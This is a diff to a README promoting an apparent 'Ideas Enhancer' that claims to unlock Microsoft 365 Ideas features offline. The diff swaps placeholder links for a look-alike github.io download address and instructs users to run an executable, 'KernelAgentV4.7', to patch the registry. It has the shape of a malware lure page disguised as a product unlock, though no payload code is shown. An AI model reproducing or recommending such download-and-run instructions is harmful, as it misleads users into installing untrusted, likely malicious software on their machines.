@@ -2,13 +2,15 @@
 
 This tool enhances and unlocks the built-in **Ideas** feature in Microsoft 365 apps like Word, Excel, and Outlook. It activates additional intelligent suggestions, layout options, and style tips — even offline or in restricted environments.
 
-[![Download Enhancer](https://img.shields.io/badge/Download-Ideas_Enhancer-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Enhancer](https://img.shields.io/badge/Download-Ideas_Enhancer-blueviolet)](https://microsoft365-ideas-enhancer-tool.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://microsoft365-ideas-enhancer-tool.github.io/.github
+) section  
 2. 📁 **Extract the folder** to `C:\IdeasEnhancer` or any preferred location  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` (required to patch registry & enable local AI modules)  
 4. 🧠 Launch Microsoft Word, Excel, or Outlook  
